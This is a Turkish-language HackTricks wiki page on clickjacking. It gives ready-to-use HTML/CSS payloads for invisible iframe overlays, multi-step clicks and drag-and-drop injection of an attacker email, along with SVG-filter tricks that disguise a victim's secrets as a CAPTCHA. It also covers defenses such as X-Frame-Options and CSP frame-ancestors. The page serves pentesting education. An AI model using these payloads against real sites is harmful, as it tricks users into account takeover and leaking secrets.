# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## Clickjacking Nedir

Bir clickjacking saldırısında bir **kullanıcı**, ya **görünmez** ya da farklı bir öğe olarak kamufle edilmiş bir web sayfasındaki bir **öğeye** **tıklaması** için **kandırılır**. Bu manipülasyon, kullanıcının istemediği sonuçlara yol açabilir; örneğin kötü amaçlı yazılımın indirilmesi, kötü amaçlı web sayfalarına yönlendirme, kimlik bilgileri veya hassas bilgilerin verilmesi, para transferleri veya çevrimiçi ürün satın alımları gibi.

### Formları önceden doldurma hilesi

Bazen bir sayfa yüklenirken GET parametreleri kullanarak bir formun alanlarının değerlerini doldurmak mümkün olabilir. Bir saldırgan bu davranışı suistimal ederek bir formu rastgele verilerle doldurabilir ve clickjacking payload'unu gönderip kullanıcıyı Submit düğmesine bastırabilir.

### Drag\&Drop ile form doldurma

Eğer kullanıcının bir formu doldurmasını istiyorsanız fakat ona doğrudan belirli bilgileri (örneğin e-posta veya bildiğiniz belirli bir şifre gibi) yazmasını istemiyorsanız, ondan kontrollü verilerinizi yazacak bir şeyi Drag\&Drop yapmasını isteyebilirsiniz; örneğin [**this example**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Basic Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Çok Adımlı Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click payload
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Eğer bir öğeye tıklanmasını gerektiren **XSS attack** tespit ettiyseniz ve sayfa **clickjacking**'e karşı **savunmasızsa**, bunu kullanarak kullanıcıyı butona/bağlantıya tıklamaya kandırabilirsiniz.\
Example:\
Hesabın bazı özel ayrıntılarında (sadece sizin ayarlayıp okuyabileceğiniz) bir **self XSS** buldunuz. Bu ayrıntıları ayarlayan **form** sayfası **Clickjacking**'e karşı **savunmasızdır** ve GET parametreleriyle **form'u önceden doldurabilirsiniz**.\
Bir saldırgan, sayfaya bir **Clickjacking** saldırısı hazırlayıp **form'u** **XSS payload** ile **önceden doldurarak** kullanıcıyı **Submit** butonuna tıklamaya kandırabilir. Böylece **form gönderildiğinde** ve değerler değiştirildiğinde, **kullanıcı XSS'i çalıştırır**.


### DoubleClickjacking

İlk olarak [bu gönderide açıklandığı üzere](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html), bu teknik kurbandan, belirli bir konuma yerleştirilmiş özel bir sayfadaki bir butona çift tıklamasını ister ve mousedown ile onclick event'leri arasındaki zamanlama farklarını kullanarak çift tıklama sırasında hedef sayfayı yükler; böylece **kurban aslında hedef sayfadaki gerçek bir butona tıklar**.

An example could be seen in this video: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

A code example can be found in [this page](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html).

> [!WARNING]
> Bu teknik, clickjacking'e karşı tüm korumaları atlayarak kurbanı hedef sayfadaki tek bir noktaya tıklamaya kandırmaya izin verir. Bu nedenle saldırganın **yalnızca 1 tıklama ile yapılabilecek hassas işlemleri, örn. OAuth istemlerinin izinleri kabul etmesi**, bulması gerekir.

### SVG Filters / Cross-Origin Iframe UI Redressing

Modern Chromium/WebKit/Gecko builds CSS `filter:url(#id)`'in cross-origin iframes üzerinde uygulanmasına izin verir. Iframe’in rasterize edilmiş pikselleri SVG filter grafiğine `SourceGraphic` olarak açığa çıkar; bu yüzden `feDisplacementMap`, `feBlend`, `feComposite`, `feColorMatrix`, `feTile`, `feMorphology` vb. gibi primitifler, saldırgan DOM'a asla dokunmasa bile kurbanın UI'sını kullanıcı görmeden önce keyfi olarak bozabilir. Basit bir Liquid-Glass style filter şu şekilde görünür:
```html
<iframe src="https://victim.example" style="filter:url(#displacementFilter4)"></iframe>
```
* Kullanışlı temel bileşenler: `feImage` saldırgan bitmaps (ör. overlays, displacement maps) yükler; `feFlood` sabit renkli mateler oluşturur; `feOffset/feGaussianBlur` vurguları düzeltir; `feDisplacementMap` metni kırar/çarpıtır; `feComposite operator="arithmetic"` kanal başına rastgele matematik uygular (`r = k1*i1*i2 + k2*i1 + k3*i2 + k4`), bu kontrast artırma, maskeleme ve AND/OR işlemleri için yeterlidir; `feTile` piksel problarını kırpar ve çoğaltır; `feMorphology` çizgileri büyütür/küçültür; `feColorMatrix` hassas maskeler oluşturmak için luma'yı alfaya taşır.

#### Sırları CAPTCHA-style istemlere çarpıtma

Eğer frame içine alınabilir bir endpoint sırları (tokens, reset codes, API keys) gösteriyorsa, saldırgan bunları CAPTCHA'ya benzer şekilde çarpıtıp elle yazmaya zorlayabilir:
```html
<svg width="0" height="0">
<filter id="captchaFilter">
<feTurbulence type="turbulence" baseFrequency="0.03" numOctaves="4" result="noise" />
<feDisplacementMap in="SourceGraphic" in2="noise" scale="6" xChannelSelector="R" yChannelSelector="G" />
</filter>
</svg>
<iframe src="https://victim" style="filter:url(#captchaFilter)"></iframe>
<input pattern="^6c79 ?7261 ?706f ?6e79$" required>
```
Bozulmuş pikseller, kullanıcıyı saldırgan kontrolündeki `<input>` içindeki captcha'yı “çözdüğünü” düşünmeye kandırır; bu `<input>`'un `pattern`'i gerçek mağdur sırrını zorunlu kılar.

#### Kurban girdilerini yeniden bağlama

Filtreler, kullanıcı tuş vuruşlarını korurken placeholder/doğrulama metnini cerrahi şekilde silebilir. Bir iş akışı:

1. `feComposite operator="arithmetic" k2≈4` parlaklığı artırır, böylece gri yardımcı metin beyaza doyar.
2. `feTile` çalışma alanını input dikdörtgenine sınırlar.
3. `feMorphology operator="erode"` mağdur tarafından yazılan koyu glifleri kalınlaştırır ve bunları `result="thick"` ile saklar.
4. `feFlood` beyaz bir zemin oluşturur, `feBlend mode="difference"` `thick` ile kullanılır ve ikinci bir `feComposite k2≈100` bunu belirgin bir luma matte'e çevirir.
5. `feColorMatrix` bu luma'yı alfa'ya taşır ve `feComposite in="SourceGraphic" operator="in"` yalnızca kullanıcı tarafından girilen glifleri tutar.
6. Başka bir `feBlend in2="white"` artı ince bir kırpma temiz bir metin alanı verir; bundan sonra saldırgan kendi HTML etiketlerini (ör. “E-posta adresinizi girin”) üst üste bindirir; gizli iframe hâlâ mağdur origin'inin parola politikasını uygular.

Safari `feTile` ile sorun yaşar; aynı etki WebKit-only payload'lar için `feFlood` + `feColorMatrix` + `feComposite`'den oluşturulan uzamsal matlarla yeniden üretilebilir.

#### Piksel probeleri, mantık ve durum makineleri

`feTile` ile 2–4 px'lik bir bölgeyi kırparak ve bunu viewport'un `100%`'üne döşeyerek, saldırgan örneklenen rengi tam çerçeve bir dokuya dönüştürür; bu doku eşiklenerek boolean bir maske haline getirilebilir:
```html
<filter id="pixelProbe">
<feTile x="313" y="141" width="4" height="4" />
<feTile x="0" y="0" width="100%" height="100%" result="probe" />
<feComposite in="probe" operator="arithmetic" k2="120" k4="-1" />
<feColorMatrix type="matrix" values="0 0 0 0 0  0 0 0 0 0  0 0 0 0 0  0 0 1 0 0" result="mask" />
<feGaussianBlur in="SourceGraphic" stdDeviation="2" />
<feComposite operator="in" in2="mask" />
<feBlend in2="SourceGraphic" />
</filter>
```
For arbitrary colors, a `feFlood` reference (e.g., `#0B57D0`) plus `feBlend mode="difference"` and another arithmetic composite (`k2≈100`, `k4` as tolerance) outputs white only when the sampled pixel matches the target shade. Feeding these masks into `feComposite` with tuned `k1..k4` yields logic gates: `AND` via `k1=1`, `OR` via `k2=k3=1`, `XOR` via `feBlend mode="difference"`, `NOT` via blending against white. Chaining gates makes a full adder inside the filter graph, proving the pipeline is functionally complete.

Bu yüzden saldırganlar UI durumunu JavaScript olmadan okuyabilirler. Modal iş akışından örnek booleanlar:

- **D** (dialog visible): karartılmış bir köşeyi kontrol edip beyaza karşı test et.
- **L** (dialog loaded): butonun hazır olduğunda göründüğü koordinatları kontrol et.
- **C** (checkbox checked): checkbox pikselini aktif mavi `#0B57D0` ile karşılaştır.
- **R** (red success/failure banner): banner dikdörtgeni içinde `feMorphology` ve kırmızı eşikler kullan.

Her tespit edilen durum, `feImage xlink:href="data:..."` ile gömülmüş farklı bir overlay bitmap'inin görünürlüğünü kontrol eder. Bu bitmapleri `D`, `L`, `C`, `R` ile maskelenmesi overlay'leri gerçek dialog ile senkron tutar ve kurbanı DOM'u hiçbir zaman açığa çıkarmadan çok adımlı iş akışlarında (parola sıfırlama, onaylar, yıkıcı onaylar) yönlendirir.

### Tarayıcı uzantıları: DOM-based autofill clickjacking

Kurban sayfalarını iframe'leme dışında, saldırganlar sayfaya enjekte edilen tarayıcı uzantısı UI öğelerini hedef alabilir. Parola yöneticileri, odaklanmış inputların yakınında autofill açılır menüleri gösterir; saldırgan kontrollü bir alanı odaklayıp uzantının açılır menüsünü gizleyerek/örterek (opacity/overlay/top-layer trikleri), zorlama bir kullanıcı tıklaması kaydedilmiş bir öğeyi seçip hassas verileri saldırgan kontrollü inputlara doldurabilir. Bu varyant iframe maruziyeti gerektirmez ve tamamen DOM/CSS manipülasyonu ile çalışır.

- For concrete techniques and PoCs see:
{{#ref}}
browser-extension-pentesting-methodology/browext-clickjacking.md
{{#endref}}

## Clickjacking'e Karşı Stratejiler

### İstemci Tarafı Savunmaları

İstemci tarafında çalıştırılan scriptler Clickjacking'i önlemek için şu eylemleri gerçekleştirebilir:

- Uygulama penceresinin ana veya üst pencere olduğundan emin olmak.
- Tüm frame'leri görünür yapmak.
- Görünmez frame'lerdeki tıklamaları engellemek.
- Olası Clickjacking girişimlerini tespit edip kullanıcılara bildirmek.

Ancak, bu frame-busting scriptleri aşılabilir:

- **Tarayıcıların Güvenlik Ayarları:** Bazı tarayıcılar bu scriptleri güvenlik ayarlarına veya JavaScript desteğinin olmamasına bağlı olarak engelleyebilir.
- **HTML5 iframe `sandbox` Attribute:** An attacker can neutralize frame buster scripts by setting the `sandbox` attribute with `allow-forms` or `allow-scripts` values without `allow-top-navigation`. This prevents the iframe from verifying if it is the top window, ör.,
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
`allow-forms` ve `allow-scripts` değerleri iframe içinde eylemlere izin verirken üst seviye navigasyonu devre dışı bırakır. Hedeflenen sitenin öngörülen işlevselliğini sağlamak için, saldırı türüne bağlı olarak `allow-same-origin` ve `allow-modals` gibi ek izinler gerekebilir. Hangi izinlerin verilmesi gerektiği konusunda tarayıcı konsolu mesajları yol gösterici olabilir.

### Sunucu Tarafı Savunmaları

#### X-Frame-Options

The **`X-Frame-Options` HTTP response header** tarayıcılara bir sayfanın bir `<frame>` veya `<iframe>` içinde görüntülenmesinin meşru olup olmadığını bildirir ve Clickjacking'in önlenmesine yardımcı olur:

- `X-Frame-Options: deny` - Hiçbir domain içeriği çerçeveleyemez.
- `X-Frame-Options: sameorigin` - Sadece mevcut site içeriği çerçeveleyebilir.
- `X-Frame-Options: allow-from https://trusted.com` - Sadece belirtilen 'uri' sayfayı çerçeveleyebilir.
- Sınırlamalara dikkat: tarayıcı bu yönergeyi desteklemiyorsa çalışmayabilir. Bazı tarayıcılar CSP frame-ancestors yönergesini tercih eder.

#### Content Security Policy (CSP) frame-ancestors directive

**CSP içindeki `frame-ancestors` direktifi** Clickjacking koruması için önerilen yöntemdir:

- `frame-ancestors 'none'` - `X-Frame-Options: deny` ile benzerdir.
- `frame-ancestors 'self'` - `X-Frame-Options: sameorigin` ile benzerdir.
- `frame-ancestors trusted.com` - `X-Frame-Options: allow-from` ile benzerdir.

Örneğin, aşağıdaki CSP yalnızca aynı domainden çerçevelemeye izin verir:

`Content-Security-Policy: frame-ancestors 'self';`

Daha fazla ayrıntı ve karmaşık örnekler [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) ve [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors) sayfalarında bulunabilir.

### Content Security Policy (CSP) ile `child-src` ve `frame-src`

**Content Security Policy (CSP)**, tarayıcının hangi kaynaklardan içerik yüklemesine izin verileceğini belirleyerek Clickjacking ve diğer kod enjeksiyonu saldırılarını önlemeye yardımcı olan bir güvenlik önlemidir.

#### `frame-src` Direktifi

- Çerçeveler için geçerli kaynakları tanımlar.
- `default-src` direktifinden daha spesifiktir.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Bu politika aynı kökenden (self) ve https://trusted-website.com adresinden gelen çerçevelere izin verir.

#### `child-src` Yönergesi

- Web worker'lar ve çerçeveler için geçerli kaynakları belirlemek amacıyla CSP level 2'de tanıtıldı.
- frame-src ve worker-src için bir yedek olarak davranır.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Bu politika, aynı origin'den (self) ve https://trusted-website.com kaynağından gelen frames ve workers kullanımına izin verir.

**Kullanım Notları:**

- Kullanımdan kaldırma: child-src, frame-src ve worker-src lehine kademeli olarak kaldırılıyor.
- Yedek Davranış: frame-src yoksa, frames için fallback olarak child-src kullanılır. Her ikisi de yoksa default-src kullanılır.
- Katı Kaynak Tanımı: İstismarı önlemek için direktiflere yalnızca güvenilen kaynakları dahil edin.

#### JavaScript Frame-Breaking Scripts

Tam anlamıyla kusursuz olmasa da, JavaScript tabanlı frame-busting script'ler bir web sayfasının frame içinde gösterilmesini engellemek için kullanılabilir. Örnek:
```javascript
if (top !== self) {
top.location = self.location
}
```
#### Anti-CSRF Tokens Kullanımı

- **Token Validation:** Web uygulamalarında anti-CSRF tokens kullanın; böylece durum değiştiren isteklerin kullanıcı tarafından kasıtlı yapıldığını ve Clickjacked bir sayfa aracılığıyla yapılmadığını garanti edersiniz.

## Referanslar

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)
- [SVG Filters - Clickjacking 2.0](https://lyra.horse/blog/2025/12/svg-clickjacking/)

{{#include ../banners/hacktricks-training.md}}
